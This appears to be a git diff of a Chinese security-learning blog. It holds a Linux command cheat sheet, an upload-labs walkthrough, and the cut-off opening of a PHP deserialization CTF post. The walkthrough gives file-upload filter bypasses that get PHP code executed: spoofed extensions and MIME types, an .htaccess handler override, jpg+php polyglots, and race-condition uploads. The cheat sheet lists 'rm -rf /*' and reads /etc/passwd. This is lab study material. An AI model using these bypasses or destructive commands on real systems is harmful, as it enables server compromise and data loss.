-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>
-
-<p>再编辑镜像源设置文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
-
-<p>最后复制下面的所有内容替换掉原文件中的所有内容（阿里源）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
-
-<h6 id="17-root模式"><a href="#17-root模式" class="headerlink" title="17.root模式"></a>17.root模式</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入为su root</span><br><span class="line">退出为快捷键ctrl+d或者输入exit</span><br></pre></td></tr></table></figure>
-
-<h6 id="18-pwd命令（查看目录的绝对路径）"><a href="#18-pwd命令（查看目录的绝对路径）" class="headerlink" title="18.pwd命令（查看目录的绝对路径）"></a>18.pwd命令（查看目录的绝对路径）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwd /</span><br></pre></td></tr></table></figure>
-
-<h6 id="19-关机命令"><a href="#19-关机命令" class="headerlink" title="19.关机命令"></a>19.关机命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shutdown -h now 关闭系统</span><br><span class="line">shutdown -r now 重启系统</span><br><span class="line">reboot    重启系统</span><br></pre></td></tr></table></figure>
-
-<h6 id="20-chmod命令（权限管理）"><a href="#20-chmod命令（权限管理）" class="headerlink" title="20.chmod命令（权限管理）"></a>20.chmod命令（权限管理）</h6><p>每个文件都有三个权限分别是r–读，w–写，x–执行，分别对应数字是4，2，1</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 764 name即赋予了name文件所有人的全部权限，文件所有组拥有读和写的权限，而其他人只拥有读的权限。</span><br></pre></td></tr></table></figure>
-
-<p>777的第一个7代表user即文件所有人，第二个6代表gourp即文件所有组，第三个4代表other即其他人</p>
-<h6 id="21-gdb"><a href="#21-gdb" class="headerlink" title="21.gdb"></a>21.gdb</h6><p>gdb是一种程序调试工具</p>
-<h6 id="22-find命令（可寻找文件）"><a href="#22-find命令（可寻找文件）" class="headerlink" title="22.find命令（可寻找文件）"></a>22.find命令（可寻找文件）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /home -name &quot;*.txt&quot;    为寻找/home里的.txt文件</span><br><span class="line">find -name &quot;*.txt&quot;    为寻找该目录下的.txt文件</span><br></pre></td></tr></table></figure>
-
-<h6 id="23-ps命令"><a href="#23-ps命令" class="headerlink" title="23.ps命令"></a>23.ps命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef         //查看所有正在运行的进程</span><br></pre></td></tr></table></figure>
-
-<h6 id="24-help命令"><a href="#24-help命令" class="headerlink" title="24.help命令"></a>24.help命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令 --help</span><br></pre></td></tr></table></figure>
-
-<h6 id="25-mount命令（挂载）"><a href="#25-mount命令（挂载）" class="headerlink" title="25.mount命令（挂载）"></a>25.mount命令（挂载）</h6><p>linux只能访问根目录里面的东西，如果想要访问根目录以外的东西就需要先”挂载“。</p>
-<h6 id="26-tail命令和head命令"><a href="#26-tail命令和head命令" class="headerlink" title="26.tail命令和head命令"></a>26.tail命令和head命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail -5 /etc/passwd    #查看后5行内容</span><br><span class="line">head -5     #查看前5行内容</span><br></pre></td></tr></table></figure>
-
-<h6 id="27-chown命令（改变文件的属主）"><a href="#27-chown命令（改变文件的属主）" class="headerlink" title="27.chown命令（改变文件的属主）"></a>27.chown命令（改变文件的属主）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown root /var/run/httpd.pid       /var/run/httpd.pid 的所有者设置 root</span><br><span class="line">chown runoob:runoobgroup file1.txt    将文件 file1.txt 的拥有者设为 runoob，群体的使用者 runoobgroup </span><br><span class="line">chown -R runoob:runoobgroup *       将当前前目录下的所有文件与子目录的拥有者皆设为 runoob，群体的使用者 runoobgroup</span><br></pre></td></tr></table></figure>
-
-<h6 id="28-kill命令（结束进程）"><a href="#28-kill命令（结束进程）" class="headerlink" title="28.kill命令（结束进程）"></a>28.kill命令（结束进程）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill pid       //杀死该pid的进程</span><br><span class="line">kill -9 pid    //强制杀死该进程</span><br></pre></td></tr></table></figure>
-
-<h6 id="29-grep命令"><a href="#29-grep命令" class="headerlink" title="29.grep命令"></a>29.grep命令</h6><p>用于查找文件里符合条件的字符串</p>
-<h6 id="30-tar命令"><a href="#30-tar命令" class="headerlink" title="30.tar命令"></a>30.tar命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -cvf test.tar test     将test文件夹打包为test.tar并不压缩</span><br><span class="line">tar -zcvf test.tar.gz test     将test文件打包后以gzip压缩，默认以tar.gz为结尾名称为test.tar.gz</span><br></pre></td></tr></table></figure>
-
-<h6 id="31-more命令和less命令（分屏显示指定文件的内容）"><a href="#31-more命令和less命令（分屏显示指定文件的内容）" class="headerlink" title="31.more命令和less命令（分屏显示指定文件的内容）"></a>31.more命令和less命令（分屏显示指定文件的内容）</h6><h6 id="32-which命令（显示命令的绝对路径）"><a href="#32-which命令（显示命令的绝对路径）" class="headerlink" title="32.which命令（显示命令的绝对路径）"></a>32.which命令（显示命令的绝对路径）</h6>]]></content>
   </entry>
   <entry>
     <title>mysql基础</title>
@@ -970,6 +893,83 @@
 <p>例如</p>
 <p><img src="/2023/03/29/nkctf%20web/image-20230410215740449.png" alt="image-20230410215740449"></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>linux命令</title>
+    <url>/2022/10/03/linux/</url>
+    <content><![CDATA[<p>linux的基本命令</p>
+<span id="more"></span>
+
+<h6 id="1-cd命令（切换目录）"><a href="#1-cd命令（切换目录）" class="headerlink" title="1.cd命令（切换目录）"></a>1.cd命令（切换目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /                 //切换到根目录</span><br><span class="line">cd /bin              //切换到根目录下的bin目录</span><br><span class="line">cd ../               //切换到上一级目录 或者使用命令：cd ..</span><br><span class="line">cd ~                 //切换到home目录</span><br><span class="line">cd -                 //切换到上次访问的目录</span><br><span class="line">cd xx(文件夹名)       //切换到本目录下的名为xx的文件目录，如果目录不存在报错</span><br><span class="line">cd /xxx/xx/x         //可以输入完整的路径，直接切换到目标目录，输入过程中可以使用tab键快速补全</span><br></pre></td></tr></table></figure>
+
+<h6 id="2-ls命令（查看目录）"><a href="#2-ls命令（查看目录）" class="headerlink" title="2.ls命令（查看目录）"></a>2.ls命令（查看目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls                   //查看当前目录下的所有目录和文件</span><br><span class="line">ls /                 //查看指定目录下的文件</span><br><span class="line">ls -a                //查看当前目录下的所有目录和文件（包括隐藏的文件）</span><br><span class="line">ls -l                //列表查看当前目录下的所有目录和文件（列表查看，显示更多信息），与命令&quot;ll&quot;效果一样</span><br><span class="line">ls /bin              //查看指定目录下的所有目录和文件</span><br></pre></td></tr></table></figure>
+
+<h6 id="3-mkdir命令（创建文件夹）"><a href="#3-mkdir命令（创建文件夹）" class="headerlink" title="3.mkdir命令（创建文件夹）"></a>3.mkdir命令（创建文件夹）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir tools          //在当前目录下创建一个名为tools的目录</span><br><span class="line">mkdir /bin/tools     //在指定目录下创建一个名为tools的目录</span><br><span class="line">mkdir -m 711 test1   //配置文件的权限</span><br></pre></td></tr></table></figure>
+
+<h6 id="4-touch命令（创建文件）"><a href="#4-touch命令（创建文件）" class="headerlink" title="4.touch命令（创建文件）"></a>4.touch命令（创建文件）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch tools.txt      //在该目录下创建一个后缀为txt的文件</span><br></pre></td></tr></table></figure>
+
+<h6 id="5-rm命令（删除目录与文件）"><a href="#5-rm命令（删除目录与文件）" class="headerlink" title="5.rm命令（删除目录与文件）"></a>5.rm命令（删除目录与文件）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm 文件名              //删除当前目录下的文件</span><br><span class="line">rm -f 文件名           //删除当前目录的文件（不询问）</span><br><span class="line">rm -r 文件夹名         //递归删除当前目录下此名的目录</span><br><span class="line">rm -rf 文件夹名        //递归删除当前目录下此名的目录（不询问）</span><br><span class="line">rm -rf *              //将当前目录下的所有目录和文件全部删除</span><br><span class="line">rm -rf /*             //将根目录下的所有文件全部删除【慎用！相当于格式化系统】</span><br></pre></td></tr></table></figure>
+
+<h6 id="6-mv命令（修改目录）"><a href="#6-mv命令（修改目录）" class="headerlink" title="6.mv命令（修改目录）"></a>6.mv命令（修改目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv 当前目录名 新目录名        //修改目录名，同样适用与文件操作</span><br><span class="line">mv /usr/tmp/tool /opt       //将/usr/tmp目录下的tool目录剪切到 /opt目录下面</span><br><span class="line">mv -r /usr/tmp/tool /opt    //递归剪切目录中所有文件和文件夹</span><br></pre></td></tr></table></figure>
+
+<h6 id="7-cp命令（拷贝目录）"><a href="#7-cp命令（拷贝目录）" class="headerlink" title="7.cp命令（拷贝目录）"></a>7.cp命令（拷贝目录）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/tmp/tool /opt       //将/usr/tmp目录下的tool目录复制到 /opt目录下面</span><br><span class="line">cp -r /usr/tmp/tool /opt    //递归剪切复制目录中所有文件和文件夹</span><br></pre></td></tr></table></figure>
+
+<h6 id="8-cat命令"><a href="#8-cat命令" class="headerlink" title="8.cat命令"></a>8.cat命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 文件名                    //查看文件中的全部信息(适合查看小文档)</span><br></pre></td></tr></table></figure>
+
+<h6 id="9-rmp命令（插件安装命令）"><a href="#9-rmp命令（插件安装命令）" class="headerlink" title="9.rmp命令（插件安装命令）"></a>9.rmp命令（插件安装命令）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说明：插件安装命令</span><br><span class="line">rpm -i httpd-2.2.3-22.0.1.el5.i386.rpm         //使用rpm文件安装apache </span><br><span class="line">rpm -uvh httpd-2.2.3-22.0.1.el5.i386.rpm      //使用rpm更新apache </span><br><span class="line">rpm -e httpd                                 //卸载/删除apache</span><br></pre></td></tr></table></figure>
+
+<h6 id="10-修改ip命令"><a href="#10-修改ip命令" class="headerlink" title="10.修改ip命令"></a>10.修改ip命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改网络配置文件，文件地址：/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">------------------------------------------------</span><br><span class="line">主要修改以下配置：  </span><br><span class="line">TYPE=Ethernet               //网络类型</span><br><span class="line">BOOTPROTO=static            //静态IP</span><br><span class="line">DEVICE=ens00                //网卡名</span><br><span class="line">IPADDR=192.168.1.100        //设置的IP</span><br><span class="line">NETMASK=255.255.255.0       //子网掩码</span><br><span class="line">GATEWAY=192.168.1.1         //网关</span><br><span class="line">DNS1=192.168.1.1            //DNS</span><br><span class="line">DNS2=8.8.8.8                //备用DNS</span><br><span class="line">ONBOOT=yes                  //系统启动时启动此设置</span><br><span class="line">-------------------------------------------------</span><br><span class="line">修改保存以后使用命令重启网卡：service network restart</span><br></pre></td></tr></table></figure>
+
+<h6 id="11-apt命令（一般跟随sudo进行）"><a href="#11-apt命令（一般跟随sudo进行）" class="headerlink" title="11.apt命令（一般跟随sudo进行）"></a>11.apt命令（一般跟随sudo进行）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install package_name 安装/更新一个新软件包，软件临时存放到/var/cache/apt/archives</span><br><span class="line">apt-cdrom install package_name 从光盘安装/更新一个软件包</span><br><span class="line">apt-get remove packagename #卸载一个已安装的软件包（保留配置文档）</span><br><span class="line">apt-get update 升级列表中的软件包 </span><br><span class="line">apt-get upgrade 升级所有已安装的软件</span><br><span class="line">apt-get clean 从下载的软件包中清理缓存</span><br></pre></td></tr></table></figure>
+
+<h6 id="12-sudo命令"><a href="#12-sudo命令" class="headerlink" title="12.sudo命令"></a>12.sudo命令</h6><p><code>sudo</code>是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的<code>root</code>命令的一个工具，如halt，reboot，su等等。换句话说通过此命令可以让非<code>root</code>的用户运行只有<code>root</code>才有权限执行的命令。</p>
+<h6 id="13-dpkg命令（使用时需要有deb软件包）"><a href="#13-dpkg命令（使用时需要有deb软件包）" class="headerlink" title="13.dpkg命令（使用时需要有deb软件包）"></a>13.dpkg命令（使用时需要有deb软件包）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i xx.deb  为对应的下载xx.deb软件的命令</span><br><span class="line">sudo dpkg -r xx.deb  为对应的卸载xx.deb软件的命令</span><br><span class="line">sudo dpkg -c xx.deb  显示软件包内文件列表</span><br><span class="line">sudo dpkg -l xx.deb  查询软件包的版本</span><br></pre></td></tr></table></figure>
+
+<p>使用这个命令需要有deb软件包</p>
+<p>步骤为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先cd xx.deb</span><br><span class="line">最后下载sudo dpkg -i xx.deb</span><br></pre></td></tr></table></figure>
+
+<h6 id="14-yum命令（ubuntu需配置yum安装源才可使用）"><a href="#14-yum命令（ubuntu需配置yum安装源才可使用）" class="headerlink" title="14.yum命令（ubuntu需配置yum安装源才可使用）"></a>14.yum命令（ubuntu需配置yum安装源才可使用）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install #全部安装</span><br><span class="line">yum update #全部更新</span><br></pre></td></tr></table></figure>
+
+<h6 id="15-在ubuntu上配置git"><a href="#15-在ubuntu上配置git" class="headerlink" title="15.在ubuntu上配置git"></a>15.在ubuntu上配置git</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用sudo apt-get install git进行安装</span><br><span class="line">git --version查看版本</span><br><span class="line">git config --global user.name &quot;xxx&quot;</span><br><span class="line">git config --global user.email &quot;你的邮箱地址&quot;</span><br><span class="line">ssh-keygen -t rsa -C &quot;邮箱地址&quot;   该命令获取公钥，一般会存在于/root/.ssh文件中</span><br><span class="line">gedit ~/.ssh/id_rsa.pub     使用该命令查看公钥</span><br><span class="line">复制公钥进行github的上传</span><br><span class="line">git config --list   可查看配置信息</span><br></pre></td></tr></table></figure>
+
+<h6 id="16-ubuntu换源"><a href="#16-ubuntu换源" class="headerlink" title="16.ubuntu换源"></a>16.ubuntu换源</h6><p>先备份镜像源设置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>
+
+<p>再编辑镜像源设置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+
+<p>最后复制下面的所有内容替换掉原文件中的所有内容（阿里源）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
+
+<h6 id="17-root模式"><a href="#17-root模式" class="headerlink" title="17.root模式"></a>17.root模式</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入为su root</span><br><span class="line">退出为快捷键ctrl+d或者输入exit</span><br></pre></td></tr></table></figure>
+
+<h6 id="18-pwd命令（查看目录的绝对路径）"><a href="#18-pwd命令（查看目录的绝对路径）" class="headerlink" title="18.pwd命令（查看目录的绝对路径）"></a>18.pwd命令（查看目录的绝对路径）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwd /</span><br></pre></td></tr></table></figure>
+
+<h6 id="19-关机命令"><a href="#19-关机命令" class="headerlink" title="19.关机命令"></a>19.关机命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shutdown -h now 关闭系统</span><br><span class="line">shutdown -r now 重启系统</span><br><span class="line">reboot    重启系统</span><br></pre></td></tr></table></figure>
+
+<h6 id="20-chmod命令（权限管理）"><a href="#20-chmod命令（权限管理）" class="headerlink" title="20.chmod命令（权限管理）"></a>20.chmod命令（权限管理）</h6><p>每个文件都有三个权限分别是r–读，w–写，x–执行，分别对应数字是4，2，1</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 764 name即赋予了name文件所有人的全部权限，文件所有组拥有读和写的权限，而其他人只拥有读的权限。</span><br></pre></td></tr></table></figure>
+
+<p>777的第一个7代表user即文件所有人，第二个6代表gourp即文件所有组，第三个4代表other即其他人</p>
+<h6 id="21-gdb"><a href="#21-gdb" class="headerlink" title="21.gdb"></a>21.gdb</h6><p>gdb是一种程序调试工具</p>
+<h6 id="22-find命令（可寻找文件）"><a href="#22-find命令（可寻找文件）" class="headerlink" title="22.find命令（可寻找文件）"></a>22.find命令（可寻找文件）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /home -name &quot;*.txt&quot;    为寻找/home里的.txt文件</span><br><span class="line">find -name &quot;*.txt&quot;    为寻找该目录下的.txt文件</span><br></pre></td></tr></table></figure>
+
+<h6 id="23-ps命令"><a href="#23-ps命令" class="headerlink" title="23.ps命令"></a>23.ps命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef         //查看所有正在运行的进程</span><br></pre></td></tr></table></figure>
+
+<h6 id="24-help命令"><a href="#24-help命令" class="headerlink" title="24.help命令"></a>24.help命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令 --help</span><br></pre></td></tr></table></figure>
+
+<h6 id="25-mount命令（挂载）"><a href="#25-mount命令（挂载）" class="headerlink" title="25.mount命令（挂载）"></a>25.mount命令（挂载）</h6><p>linux只能访问根目录里面的东西，如果想要访问根目录以外的东西就需要先”挂载“。</p>
+<h6 id="26-tail命令和head命令"><a href="#26-tail命令和head命令" class="headerlink" title="26.tail命令和head命令"></a>26.tail命令和head命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail -5 /etc/passwd    #查看后5行内容</span><br><span class="line">head -5     #查看前5行内容</span><br></pre></td></tr></table></figure>
+
+<h6 id="27-chown命令（改变文件的属主）"><a href="#27-chown命令（改变文件的属主）" class="headerlink" title="27.chown命令（改变文件的属主）"></a>27.chown命令（改变文件的属主）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown root /var/run/httpd.pid       /var/run/httpd.pid 的所有者设置 root</span><br><span class="line">chown runoob:runoobgroup file1.txt    将文件 file1.txt 的拥有者设为 runoob，群体的使用者 runoobgroup </span><br><span class="line">chown -R runoob:runoobgroup *       将当前前目录下的所有文件与子目录的拥有者皆设为 runoob，群体的使用者 runoobgroup</span><br></pre></td></tr></table></figure>
+
+<h6 id="28-kill命令（结束进程）"><a href="#28-kill命令（结束进程）" class="headerlink" title="28.kill命令（结束进程）"></a>28.kill命令（结束进程）</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill pid       //杀死该pid的进程</span><br><span class="line">kill -9 pid    //强制杀死该进程</span><br></pre></td></tr></table></figure>
+
+<h6 id="29-grep命令"><a href="#29-grep命令" class="headerlink" title="29.grep命令"></a>29.grep命令</h6><p>用于查找文件里符合条件的字符串</p>
+<h6 id="30-tar命令"><a href="#30-tar命令" class="headerlink" title="30.tar命令"></a>30.tar命令</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -cvf test.tar test     将test文件夹打包为test.tar并不压缩</span><br><span class="line">tar -zcvf test.tar.gz test     将test文件打包后以gzip压缩，默认以tar.gz为结尾名称为test.tar.gz</span><br></pre></td></tr></table></figure>
+
+<h6 id="31-more命令和less命令（分屏显示指定文件的内容）"><a href="#31-more命令和less命令（分屏显示指定文件的内容）" class="headerlink" title="31.more命令和less命令（分屏显示指定文件的内容）"></a>31.more命令和less命令（分屏显示指定文件的内容）</h6><h6 id="32-which命令（显示命令的绝对路径）"><a href="#32-which命令（显示命令的绝对路径）" class="headerlink" title="32.which命令（显示命令的绝对路径）"></a>32.which命令（显示命令的绝对路径）</h6>]]></content>
   </entry>
   <entry>
     <title>TJCTF 2023</title>
@@ -1337,6 +1337,63 @@
 ]]></content>
   </entry>
   <entry>
+    <title>upload-labs关卡</title>
+    <url>/2022/11/19/upload-labs/</url>
+    <content><![CDATA[<p>简介</p>
+<span id="more"></span>
+
+<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>js绕过<br>只允许上传.jpg|.png|.gif后缀的文件<br>那就上传.gif的文件<br>使用burp抓包<br>在burp里修改后缀.gif为.php然后执行</p>
+<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>mime头检测(会自动检测文件类型)<br>上传.php后缀的文件<br>使用burp抓包里面的Content-Type是来标识该文件是个什么类型的文件（php还是jpg或者gif等等)<br>将Content-Type后改为image&#x2F;jpeg让代码以为上传的php文件是可以通过的文件<br>然后放包</p>
+<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>源代码$deny_ext &#x3D; array(‘.asp’,’.aspx’,’.php’,’.jsp’);这个意思是.asp .aspx .php .jsp的文件都不能上传，如果检测到就进行拦截。<br>使用不常见的后缀，比如.php3 .php2等等</p>
+<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>源代码$deny_ext &#x3D; array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”)<br>这条语句几乎将不常用的后缀都已经拦截<br>所以上传.htaccess文件，让他把任何文件都当做”.php”去读取，这就是.htaccess的功能<br>写入.htacess文件一下内容<br>&lt;FilesMatch “jpg”&gt;&#x2F;&#x2F;为指定上传的文件后缀起作用<br>SetHandler application&#x2F;x-httpd-php&#x2F;&#x2F;是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错<br><br>然后再上传一个jpg后缀的文件就可以了</p>
+<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>方法一(?)<br>除了拦截的后缀的第四关一样又拦截了.htaccess<br>但源代码里没有循环，这些语句只会执行一次<br>在burp里进行修改为xx.php. .再放包<br>只要保证有两个分开的点就行了演示过程中是最简的方法，两个点放在一起会被防护规则同时删除掉<br>由于Windows系统的命名规则，无论你后缀有多少个空格和点他都会给你自动删除掉<br>方法二<br>源代码里没有了转换为小写<br>上传.php文件后<br>再burp中改为.phP<br>直接放包</p>
+<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关(?)"></a>第六关(?)</h3><p>源代码里没有了首尾去空，可以上传.php文件然后用burp抓包<br>在burp中在.php后加一个空格然后再放包</p>
+<h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p>源代码里没有了删除文件名末尾的点<br>上传.php文件后<br>再burp中改为.php.<br>直接放包</p>
+<h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p>源代码中没有了去除字符串::$DATA<br>上传.php文件后<br>再burp中改为.php::$DATA<br>直接放包</p>
+<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p>上传.php文件<br>使用burp抓包<br>然后在burp里修改为.php. .<br>最后放包</p>
+<h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p>上传.php文件<br>使用burp抓包<br>然后在burp里修改为.pphphp<br>最后放包</p>
+<h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关(?)"></a>第十一关(?)</h3><h3 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关(?)"></a>第十二关(?)</h3><h3 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h3><h3 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h3><h3 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h3><p>将一个.php文件个一个.jpg文件和成一个.jpg文件<br>在cmd中使用copy &#x2F;b xx.jpg+xx.php&#x3D;xx.jpg<br>使用burp抓包<br>进行发送</p>
+<h3 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关(?)"></a>第十六关(?)</h3><p>二次渲染</p>
+<h3 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h3><p>条件竞争<br>上传.php文件<br>进入intruder进行攻击<br>然后在positions中将§<?php phpinfo();?>§修改为§<?php phpinfo();?>§1§<br>然后进入payloads中进行循环攻击10000次<br>最后直接询问网站</p>
+<h3 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h3><p>图片型的条件竞争<br>上传.jpg文件进入intruder进行攻击<br>然后在positions中将§<?php phpinfo();?>§修改为§<?php phpinfo();?>§1§<br>然后进入payloads中进行循环攻击10000次<br>最后直接询问网站</p>
+<h3 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h3><p>该题在网页上不仅可以上传文件还可以修改文件名称<br>上传.php文件<br>然后在网页上将文件名修改为.PHP然后进行上传<br>直接访问网页</p>
+<h3 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关(?)"></a>第二十关(?)</h3>]]></content>
+  </entry>
+  <entry>
+    <title>反序列化逃逸</title>
+    <url>/2022/12/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
+    <content><![CDATA[<p>字符减少型</p>
+<span id="more"></span>
+
+<p>源码是</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_sleep</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ob</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;a*a&#x27;</span>, <span 